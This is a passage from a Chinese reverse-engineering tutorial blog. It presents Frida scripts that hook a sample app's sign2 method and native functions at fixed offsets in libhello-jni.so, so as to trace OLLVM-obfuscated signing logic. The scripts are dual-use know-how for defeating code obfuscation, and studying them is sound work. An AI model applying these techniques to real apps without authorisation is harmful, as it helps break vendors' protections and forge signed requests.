<h2 id="L5-Frida-辅助分析OLLVM-控制流平坦化"><a href="#L5-Frida-辅助分析OLLVM-控制流平坦化" class="headerlink" title="L5: Frida 辅助分析OLLVM 控制流平坦化"></a>L5: Frida 辅助分析OLLVM 控制流平坦化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java() &#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hello_jni = Java.use(&quot;com.example.hellojni.HelloJni&quot;);</span><br><span class="line">        hello_jni.sign2.implementation = function(str,str2)&#123;</span><br><span class="line">            var ret = this.sign2(str,str2);</span><br><span class="line">            console.log(&quot;sign2 arg1:&quot;,str,&quot;arg2:&quot;,str2,&quot;ret:&quot;,ret);</span><br><span class="line">            return ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function call_sign2()</span><br><span class="line">&#123;</span><br><span class="line">    //设置固定值注定调用</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.choose(&quot;com.example.hellojni.HelloJni&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                console.log(&quot;instance:&quot;,instance.sign2(&quot;0123456789&quot;,&quot;abcdefgh&quot;))</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete:function(ret)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native() &#123;</span><br><span class="line">    var base_libjni = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    var sub_13558 = base_libjni.add(0x13558);</span><br><span class="line">    //根据输入及返回结果交叉引用，首要分析sub函数。</span><br><span class="line">    // Interceptor.attach(sub_13558,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         console.log(&quot;sub_13558 OnEnter: arg1=&quot;,ptr(args[1]).readCString(),&quot;arg2=&quot;,args[2]);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave:function(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_13558 onLeave: arg0=&quot;,ptr(this.arg0).add(1).readCString());</span><br><span class="line">    //         console.log(&quot;sub_13558 onLeave: retval=&quot;,ptr(retval).readCString());</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    // var sub_12D70 = base_libjni.add(0x12D70);</span><br><span class="line">    // Interceptor.attach(sub_12D70,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.str1 = args[0];</span><br><span class="line">    //         this.str2 = args[1];</span><br><span class="line">    //         this.v51 = args[2];</span><br><span class="line">    //         console.log(&quot;sub_12D70 arg0:&quot;,ptr(args[0]).add(1).readCString(),&quot;arg1:&quot;,ptr(args[1]).add(1).readCString(),&quot;\n&quot;);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_12D70 ret arg0:&quot;,ptr(this.str1).add(1).readCString(),&quot;arg1:&quot;,ptr(this.str2).add(1).readCString(),&quot;\n&quot;);</span><br><span class="line">    //         console.log(&quot;sub_12D70 ret arg2:\n&quot;,hexdump(ptr(this.v51).readPointer()));      </span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_162b8 = base_libjni.add(0x162b8);</span><br><span class="line">    // Interceptor.attach(sub_162b8,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         this.arg1 = args[1];</span><br><span class="line">    //         this.arg2 = args[2];</span><br><span class="line">    //         console.log(&quot;sub_162b8 arg0:\n&quot;,ptr(args[0]).readCString(),&quot;\narg1:\n&quot;,args[1],&quot;\n&quot;);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave(retval)&#123;</span><br><span class="line">    //         //console.log(&quot;sub_162b8 ret arg0:&quot;,hexdump(this.arg0),&quot;arg1:&quot;,hexdump(this.arg1),&quot;\n&quot;);</span><br><span class="line">    //         console.log(&quot;sub_162b8 ret arg2:\n&quot;,ptr(this.arg2).readLong());      </span><br><span class="line">            </span><br><span class="line">    //         console.log(&quot;sub_162b8 retval\n&quot;,ptr(retval).readCString());</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_130F0 = base_libjni.add(0x130F0);</span><br><span class="line">    // Interceptor.attach(sub_130F0,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         console.log(&quot;sub_130F0 arg0:\n&quot;,hexdump(args[0],&#123; offset: 0, length: 64, header: true, ansi: true &#125;),&quot;\narg1:\n&quot;,ptr(args[1]).readCString(),&quot;\narg2:\n&quot;,args[2]);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_130F0 ret arg0:\n&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_154D4 = base_libjni.add(0x154D4);</span><br><span class="line">    Interceptor.attach(sub_154D4,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            this.arg2 = args[2];</span><br><span class="line">            console.log(&quot;sub_154D4 OnEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_154D4 OnEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_154D4 OnEnter: arg2=&quot;,args[2]);</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_154D4 OnLeave: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_154D4 OnLeave: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_14844 = base_libjni.add(0x14844);</span><br><span class="line">    Interceptor.attach(sub_14844,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            console.log(&quot;sub_14844 OnEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_14844 OnEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_14844 OnLeave: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_14844 OnLeave: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_158AC = base_libjni.add(0x158AC);</span><br><span class="line">    Interceptor.attach(sub_158AC,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            console.log(&quot;sub_158AC OnEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">            console.log(&quot;sub_158AC OnEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_158AC OnLeave: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;)); </span><br><span class="line">            console.log(&quot;sub_158AC OnLeave: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_15F1C = base_libjni.add(0x15F1C);</span><br><span class="line">    // Interceptor.attach(sub_15F1C,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         this.arg2 = args[2];</span><br><span class="line">    //         console.log(&quot;sub_15F1C OnEnter: arg0=&quot;,ptr(args[0]).readCString(),&quot;arg1=&quot;,args[1],&quot;arg2=&quot;,args[2]);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_15F1C OnLeave: arg2=\n&quot;,hexdump(this.arg2,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main() &#123;</span><br><span class="line">    hook_java()</span><br><span class="line">    hook_native();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>

<h2 id="L6-1：-Frida-辅助分析OLLVM-指令替换"><a href="#L6-1：-Frida-辅助分析OLLVM-指令替换" class="headerlink" title="L6.1： Frida 辅助分析OLLVM 指令替换"></a>L6.1： Frida 辅助分析OLLVM 指令替换</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java()</span><br><span class="line">&#123;</span><br><span class="line">    // Java.perform(function()&#123;</span><br><span class="line">    //     var hellojni = Java.use(&quot;com.example.hellojni.HelloJni&quot;);</span><br><span class="line">    //     hellojni.sign2.implementation = function(str1,str2)&#123;</span><br><span class="line">    //         var ret = this.sign2(str1,str2);</span><br><span class="line">    //         console.log(&quot;sign2: arg1=&quot;,str1,&quot; arg2=&quot;,str2,&quot; ret=&quot;,ret);</span><br><span class="line">    //         return ret;</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function call_sign2()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.choose(&quot;com.example.hellojni.HelloJni&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                instance.sign2(&quot;0123456789&quot;,&quot;abcdefgh&quot;)</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete:function(ret)</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native()</span><br><span class="line">&#123;</span><br><span class="line">    var libjni_base = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    var sign2 = Module.findExportByName(&quot;libhello-jni.so&quot;,&quot;Java_com_example_hellojni_HelloJni_sign2&quot;);</span><br><span class="line">    console.log(&quot;base:&quot;,libjni_base,&quot;sign2:&quot;,sign2);</span><br><span class="line">    Interceptor.attach(sign2,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.str1 = args[2];</span><br><span class="line">            this.str2 = args[3];</span><br><span class="line">            //https://github.com/frida/frida-java-bridge/search?q=GetStringUTFChars&amp;unscoped_q=GetStringUTFChars</span><br><span class="line">            console.log(&quot;Native: str1=&quot;,ptr(Java.vm.tryGetEnv().getStringUtfChars(this.str1)).readCString(),&quot; str2=&quot;,ptr(Java.vm.tryGetEnv().getStringUtfChars(this.str2)).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;Native: retval=&quot;,ptr(Java.vm.tryGetEnv().getStringUtfChars(retval)).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_1DFB4 = libjni_base.add(0x1DFB4);</span><br><span class="line">    // Interceptor.attach(sub_1DFB4,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         this.arg1 = args[1];</span><br><span class="line">    //         //ida 里面可能识别的不对，需要分析下参数传递是否正确</span><br><span class="line">    //         //void __usercall sub_1DFB4(_QWORD *a1@&lt;X0&gt;, _QWORD *a2@&lt;X1&gt;)</span><br><span class="line">    //         console.log(&quot;sub_1DFB4 onEnter: str1=&quot;,ptr(this.arg0).add(1).readCString(),&quot; str2=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave:function(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_1DFB4 onLeave: retval=&quot;,ptr(retval).readCString());</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_1E298 = libjni_base.add(0x1E298);</span><br><span class="line">    // Interceptor.attach(sub_1E298,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         this.arg1 = args[1];</span><br><span class="line">    //         this.arg2 = args[2];</span><br><span class="line">    //         console.log(&quot;sub_1E298 onEnter: str1=&quot;,ptr(this.arg0).add(1).readCString(),&quot; str2=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave:function(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_1E298 onLeave: retval=&quot;,ptr(retval).add(1).readCString());</span><br><span class="line">    //         console.log(&quot;sub_1E298 onLeave: arg2=&quot;,hexdump(ptr(this.arg2).readPointer()));</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_1AB4C = libjni_base.add(0x1AB4C);</span><br><span class="line">    Interceptor.attach(sub_1AB4C,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            this.arg2 = args[2];</span><br><span class="line">            console.log(&quot;sub_1AB4C onEnter: arg0=&quot;,ptr(this.arg0).readCString(),&quot; arg1=&quot;,this.arg1);</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_1AB4C onLeave: arg2=&quot;,hexdump(this.arg2,&#123; offset: 0, length: 16, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_171C4 = libjni_base.add(0x171C4);</span><br><span class="line">    Interceptor.attach(sub_171C4,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            console.log(&quot;sub_171C4 onEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">            console.log(&quot;sub_171C4 onEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_171C4 onLeave: retval=&quot;,hexdump(retval,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    var sub_18490 = libjni_base.add(0x18490);</span><br><span class="line">    Interceptor.attach(sub_18490,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            console.log(&quot;sub_18490 onEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">            console.log(&quot;sub_18490 onEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123; </span><br><span class="line">            console.log(&quot;sub_18490 onLeave: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">            console.log(&quot;sub_18490 onLeave: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java();</span><br><span class="line">    hook_native();</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<h2 id="L6-2：-Frida-辅助分析OLLVM-控制流混淆"><a href="#L6-2：-Frida-辅助分析OLLVM-控制流混淆" class="headerlink" title="L6.2： Frida 辅助分析OLLVM 控制流混淆"></a>L6.2： Frida 辅助分析OLLVM 控制流混淆</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hello_jni = Java.use(&quot;com.example.hellojni.HelloJni&quot;);</span><br><span class="line">        hello_jni.sign2.implementation = function(str1,str2)&#123;</span><br><span class="line">            var ret = this.sign2(str1,str2);</span><br><span class="line">            console.log(&quot;sign2: arg1=&quot;,str1,&quot;arg2=&quot;,str2,&quot;ret=&quot;,ret);</span><br><span class="line">            return ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function call_sign2()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.choose(&quot;com.example.hellojni.HelloJni&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                instance.sign2(&quot;0123456789&quot;,&quot;abcdefgh&quot;)</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete:function(ret)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native()</span><br><span class="line">&#123;</span><br><span class="line">    var libjni_base = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    var sign2 = Module.findExportByName(&quot;libhello-jni.so&quot;,&quot;Java_com_example_hellojni_HelloJni_sign2&quot;);</span><br><span class="line">    console.log(&quot;base:&quot;,libjni_base,&quot;sign2:&quot;,sign2);</span><br><span class="line"></span><br><span class="line">    var sub_12B44 = libjni_base.add(0x12B44);</span><br><span class="line">    Interceptor.attach(sub_12B44,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            console.log(&quot;sub_12B44 onEnter: arg1=&quot;,ptr(this.arg1).readCString(),&quot;arg2=&quot;,ptr(this.arg2).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_12B44 onLeave: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">            //console.log(&quot;sub_12B44 onLeave: ret =&quot;,ptr(retval).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_1391C = libjni_base.add(0x1391C);</span><br><span class="line">    Interceptor.attach(sub_1391C,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            //console.log(&quot;sub_1391C onEnter: arg1=&quot;,ptr(this.arg1).readCString(),&quot;arg2=&quot;,ptr(this.arg2).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_1391C onLeave: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">            //console.log(&quot;sub_1391C onLeave: ret =&quot;,ptr(retval).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_18D30 = libjni_base.add(0x18D30);</span><br><span class="line">    Interceptor.attach(sub_18D30,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            this.arg3 = args[2];</span><br><span class="line">            console.log(&quot;sub_18D30 onEnter: arg1=&quot;,ptr(this.arg1).readCString(),&quot;arg2=&quot;,ptr(this.arg2).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_18D30 onLeave: retval=&quot;,hexdump(retval));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_18AB0 = libjni_base.add(0x18AB0);</span><br><span class="line">    Interceptor.attach(sub_18AB0,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            this.x8 = this.context.x8;</span><br><span class="line">            //方法的返回值一般都在 x0 上；如果方法返回值是一个较大的数据结构时，结果会存在 x8 执行的地址上。</span><br><span class="line">            //如果打印X0没有结果，可以看汇编查看是否是X8存储的结果（jstring结构体+0x10指针）</span><br><span class="line">            console.log(&quot;sub_18AB0 onEnter: arg1=&quot;,ptr(this.arg1).add(1).readCString(),&quot;arg2=&quot;,ptr(this.arg2).add(1).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            //console.log(&quot;sub_18AB0 onLeave: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">            console.log(&quot;sub_18AB0 onLeave: retx8 =&quot;,hexdump(ptr(this.x8).add(Process.pointerSize*2).readPointer()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_12CF4 = libjni_base.add(0x12CF4);</span><br><span class="line">    Interceptor.attach(sub_12CF4,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            console.log(&quot;sub_12CF4 onEnter: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_12CF4 onLeave: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">            //console.log(&quot;sub_12CF4 onLeave: ret =&quot;,ptr(retval).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    var sub_16900 = libjni_base.add(0x16900);</span><br><span class="line">    Interceptor.attach(sub_16900,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            this.arg3 = args[2];</span><br><span class="line">            console.log(&quot;sub_16900 onEnter: arg1=&quot;,ptr(this.arg1).readCString());</span><br><span class="line">            console.log(&quot;sub_16900 onEnter: arg2=&quot;,this.arg2);</span><br><span class="line">            console.log(&quot;sub_16900 onEnter: arg3=&quot;,ptr(this.arg3).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_16900 onLeave: arg1=&quot;,ptr(this.arg1).readCString());</span><br><span class="line">            console.log(&quot;sub_16900 onLeave: arg2=&quot;,this.arg2);</span><br><span class="line">            console.log(&quot;sub_16900 onLeave: arg3=&quot;,hexdump(this.arg3));</span><br><span class="line">            //console.log(&quot;sub_16900 onLeave: ret =&quot;,ptr(retval).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java()</span><br><span class="line">    hook_native()</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<h2 id="L7：Frida-辅助分析非标准算法"><a href="#L7：Frida-辅助分析非标准算法" class="headerlink" title="L7：Frida 辅助分析非标准算法"></a>L7：Frida 辅助分析非标准算法</h2><h2 id="L8：IDA-Trace-辅助分析非标准算法"><a href="#L8：IDA-Trace-辅助分析非标准算法" class="headerlink" title="L8：IDA Trace 辅助分析非标准算法"></a>L8：IDA Trace 辅助分析非标准算法</h2><h2 id="L9：IDA-Trace辅助分析OOLVM混淆的非标准算法"><a href="#L9：IDA-Trace辅助分析OOLVM混淆的非标准算法" class="headerlink" title="L9：IDA Trace辅助分析OOLVM混淆的非标准算法"></a>L9：IDA Trace辅助分析OOLVM混淆的非标准算法</h2><p>后面三课的内容涉及的Frida用法不多，而且之前也都已经涉及到，后面有空了连同上一篇补充下细节。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol>
<li>个人感觉Frida辅助分析OLLVM主要在于运行时HOOK获取到解密后的字符串，以及通过交叉引用获取到程序的参数。</li>
</ol>
<p>附件下载：<a href="samples.zip" target="_blank">链接</a></p>
]]></content>
      <categories>
        <category>移动终端</category>
      </categories>
      <tags>
        <tag>Frida</tag>
      </tags>
  </entry>
</search>
